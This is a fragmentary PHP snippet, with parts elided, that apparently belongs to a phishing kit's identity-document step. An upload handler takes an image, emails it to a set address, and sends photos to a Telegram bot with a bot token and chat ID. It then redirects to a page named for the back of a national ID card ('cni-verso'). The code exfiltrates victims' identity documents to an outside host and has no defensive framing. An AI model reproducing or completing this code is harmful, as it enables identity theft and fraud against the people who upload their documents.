...
function telegram_send($photo, $bot_token, $chat_login) {
  $curl = curl_init();
  $format   = 'HTML';
  curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $bot_token .'/sendPhoto?chat_id='. $chat_login .'&photo='. $photo);
...
if(isset($_FILES['fileUpload'])){
      ...
      if(empty($errors)==true){
        ...
        $mail=mail($my_mail,$Subject,$message,$head);
         ...
         echo "Success";
         header('Location: ../steps/confirm-cni-verso.php');
      }else{
         print_r($errors);
      }
